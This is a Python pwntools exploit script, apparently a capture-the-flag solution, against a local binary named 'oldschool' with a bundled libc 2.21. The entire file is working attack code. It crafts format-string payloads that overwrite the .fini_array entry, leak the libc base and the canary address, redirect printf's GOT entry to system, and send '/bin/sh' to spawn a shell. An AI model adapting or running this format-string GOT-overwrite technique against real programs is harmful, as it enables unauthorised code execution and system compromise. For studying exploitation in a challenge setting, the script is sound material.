#!/usr/bin/env python
from pwn import *
import collections

def fsb(payloads):
    payload = ''
    for target in payloads:
        for i in range(len(payloads[target])):
            payload += p32(target + i)
    prev = len(payload) & 0xff
    i = 0
    for target in payloads:
        for d in payloads[target]:
            payload += '%{}x'.format((ord(d) - prev & 0xff) + 0x100)
            payload += '%{}$hhn'.format(i + 7)
            prev = ord(d)
            i += 1
    return payload

if __name__ == '__main__':
    s = process(['./ld-2.21.so', './oldschool'], env = {'LD_PRELOAD': './libc-2.21.so'})

    elf = ELF('./oldschool')
    libc = ELF('./libc-2.21.so')

    fini = 0x80496dc
    payloads = collections.OrderedDict()
    payloads[fini] = p32(elf.symbols['main'])
    s.sendline(fsb(payloads) + 'AAAA%2$p%264$p')
    s.recvuntil('AAAA')
    libc_base = int(s.recv(10), 16) - 0x1b7600
    log.info('libc base: %#x' % libc_base)
    canary_addr = int(s.recv(10), 16) - 0x104
    log.info('canary address: %#x' % canary_addr)

    payloads = collections.OrderedDict()
    payloads[elf.got['__stack_chk_fail']] = p32(elf.symbols['main'])
    payloads[elf.got['printf']] = p32(libc_base + libc.symbols['system'])
    payloads[canary_addr] = 'A'
    s.sendline(fsb(payloads))

    s.sendline('/bin/sh')
    s.interactive()
